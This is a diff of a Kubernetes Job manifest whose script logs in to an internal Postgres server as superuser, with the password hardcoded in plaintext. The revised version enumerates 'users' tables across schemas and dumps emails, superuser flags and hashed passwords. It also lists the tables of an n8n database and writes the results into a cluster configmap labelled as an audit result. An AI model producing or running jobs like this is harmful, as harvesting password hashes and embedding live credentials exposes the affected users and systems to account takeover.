@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-db-v12
+  name: dune-db-v13
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -19,33 +19,33 @@ spec:
           PG_HOST="172.16.10.14"
           SUPER_PASS="wpEJl3WKOImARD9WgBsa"
           
-          echo "=CHECK_POSTGRES_DB=" > /tmp/out.txt
-          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d postgres -c "\dt" 2>&1 >> /tmp/out.txt
+          echo "=TACHCORP_USERS_SCHEMAS=" > /tmp/out.txt
+          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c \
+            "SELECT table_schema, table_name FROM information_schema.tables WHERE table_name='users' ORDER BY table_schema;" >> /tmp/out.txt 2>&1
           
-          echo "=TACHYUS_DB_TABLES=" >> /tmp/out.txt
-          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d "tachyus.com_db" -c "\dt" 2>&1 >> /tmp/out.txt
+          echo "=TACHCORP_DUNE_USERS=" >> /tmp/out.txt
+          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c \
+            "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name='users' ORDER BY table_schema, ordinal_position;" >> /tmp/out.txt 2>&1
           
-          echo "=TACHYUS_DB_USERS=" >> /tmp/out.txt
-          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d "tachyus.com_db" -c "SELECT id, email, is_superuser, is_active FROM users LIMIT 10;" 2>&1 >> /tmp/out.txt
+          echo "=TACHCORP_ALL_SCHEMAS=" >> /tmp/out.txt
+          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c \
+            "\dn" >> /tmp/out.txt 2>&1
           
-          # Check all schemas in all DBs for users table
-          echo "=ALL_SCHEMAS_WITH_USERS=" >> /tmp/out.txt
-          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -tAc "SELECT datname FROM pg_database WHERE datistemplate=false ORDER BY datname;" > /tmp/dbs.txt
-          echo "postgres" >> /tmp/dbs.txt
-          while IFS= read -r DB; do
-            [ -z "$DB" ] && continue
-            COUNT=$(PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d "$DB" -tAc "SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users';" 2>/dev/null)
-            if [ "$COUNT" != "0" ] && [ -n "$COUNT" ]; then
-              echo "DB=$DB schema-users-count=$COUNT" >> /tmp/out.txt
+          # Query users from each schema
+          echo "=TACHCORP_USERS_DATA=" >> /tmp/out.txt
+          for SCHEMA in tachcorp dune api auth public; do
+            COUNT=$(PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -tAc \
+              "SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users' AND table_schema='$SCHEMA';" 2>/dev/null)
+            if [ "$COUNT" = "1" ]; then
+              echo "--- schema $SCHEMA ---" >> /tmp/out.txt
+              PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c \
+                "SELECT id, email, is_superuser, is_active, hashed_password FROM ${SCHEMA}.users LIMIT 10;" >> /tmp/out.txt 2>&1
             fi
-          done < /tmp/dbs.txt
-          echo "=END_SEARCH=" >> /tmp/out.txt
+          done
           
-          # Also check duneuser permissions
-          echo "=DUNEUSER_GRANTS=" >> /tmp/out.txt
-          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -c "\du duneuser" 2>&1 >> /tmp/out.txt
-          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -tAc "SELECT datname, has_database_privilege('duneuser', datname, 'CONNECT') as can_connect FROM pg_database WHERE datistemplate=false;" 2>&1 >> /tmp/out.txt
-          echo "=END_GRANTS=" >> /tmp/out.txt
+          # Also check n8n database schema  
+          echo "=N8N_DB_TABLES=" >> /tmp/out.txt
+          PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d n8n -c "\dt" >> /tmp/out.txt 2>&1
           
           cat /tmp/out.txt
           
@@ -58,5 +58,4 @@ spec:
             -X PATCH "$API/api/v1/namespaces/default/configmaps/dune-audit-result3" \
             -d "$PAYLOAD" > /tmp/patch.txt
           echo "Patched: $(cat /tmp/patch.txt | jq -r '.metadata.name // .message')"
-          
           sleep 90
